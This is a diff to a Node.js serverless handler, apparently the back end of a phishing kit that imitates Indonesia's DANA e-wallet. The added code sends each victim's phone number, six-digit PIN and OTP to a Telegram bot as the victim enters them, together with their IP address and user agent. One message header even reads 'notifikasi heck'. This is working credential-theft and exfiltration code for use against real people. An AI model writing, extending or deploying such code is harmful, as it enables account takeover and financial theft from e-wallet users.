@@ -26,7 +26,7 @@ async function sendToWebhook(data) {
   }
 }
 
-// Fungsi untuk mengirim notifikasi ke Telegram
+// Fungsi untuk mengirim notifikasi ke Telegram dengan format khusus
 async function sendToTelegram(data) {
   if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
     console.log('Telegram credentials not set, skipping notification');
@@ -34,18 +34,47 @@ async function sendToTelegram(data) {
   }
 
   try {
-    const message = `🔔 **New DANA Verification**\n\n` +
-                   `**Type:** ${data.type}\n` +
-                   `**Phone:** ${data.phone}\n` +
-                   `**IP:** ${data.ip || 'Unknown'}\n` +
-                   `**Time:** ${new Date().toISOString()}`;
+    let message = '';
+    
+    // Format notifikasi berdasarkan type
+    if (data.type === 'phone') {
+      message = `🔔 New DANA notifikasi heck\n\n` +
+                `├───────────────────\n` +
+                `├• NO HP : ${data.phone}\n` +
+                `╰───────────────────`;
+    } 
+    else if (data.type === 'pin') {
+      message = `🔔 New DANA Verification\n\n` +
+                `├───────────────────\n` +
+                `├• NO HP : ${data.phone}\n` +
+                `├───────────────────\n` +
+                `├• PIN  : ${data.pin}\n` +
+                `╰───────────────────`;
+    }
+    else if (data.type === 'otp') {
+      message = `🔔 New DANA Verification\n\n` +
+                `├───────────────────\n` +
+                `├• NO HP : ${data.phone}\n` +
+                `├───────────────────\n` +
+                `├• PIN  : ${data.pin}\n` +
+                `├───────────────────\n` +
+                `├• OTP : ${data.otp}\n` +
+                `╰───────────────────`;
+    } else {
+      // Format default untuk type lainnya
+      message = `🔔 New DANA Verification\n\n` +
+                `├───────────────────\n` +
+                `├• Type: ${data.type}\n` +
+                `├• NO HP : ${data.phone || 'N/A'}\n` +
+                `╰───────────────────`;
+    }
 
     const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     await axios.post(url, {
       chat_id: process.env.TELEGRAM_CHAT_ID,
       text: message,
-      parse_mode: 'Markdown'
+      parse_mode: null // Tidak menggunakan Markdown untuk format khusus
     });
     
     console.log('Notification sent to Telegram successfully');
@@ -156,6 +185,14 @@ module.exports = async (req, res) => {
             error: 'Invalid phone number' 
           });
         }
+        
+        // Kirim notifikasi ke Telegram untuk phone
+        await sendToTelegram({
+          type: 'phone',
+          phone: phone,
+          userAgent: req.headers['user-agent'],
+          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+        });
         break;
 
       case 'pin':
@@ -165,6 +202,15 @@ module.exports = async (req, res) => {
             error: 'PIN must be 6 digits' 
           });
         }
+        
+        // Kirim notifikasi ke Telegram untuk pin
+        await sendToTelegram({
+          type: 'pin',
+          phone: phone,
+          pin: pin,
+          userAgent: req.headers['user-agent'],
+          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+        });
         break;
 
       case 'otp':
@@ -174,6 +220,16 @@ module.exports = async (req, res) => {
             error: 'OTP must be 4 digits' 
           });
         }
+        
+        // Kirim notifikasi ke Telegram untuk otp
+        await sendToTelegram({
+          type: 'otp',
+          phone: phone,
+          pin: pin,
+          otp: otp,
+          userAgent: req.headers['user-agent'],
+          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+        });
         break;
 
       default:
@@ -181,19 +237,6 @@ module.exports = async (req, res) => {
           success: false, 
           error: 'Invalid type. Must be: phone, pin, or otp' 
         });
-    }
-
-    // Kirim notifikasi ke Telegram
-    try {
-      await sendToTelegram({
-        type,
-        phone,
-        userAgent: req.headers['user-agent'],
-        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
-      });
-    } catch (telegramError) {
-      console.error('Telegram error:', telegramError.message);
-      // Jangan gagalkan seluruh request karena error Telegram
     }
 
     // Kirim notifikasi ke webhook (opsional)
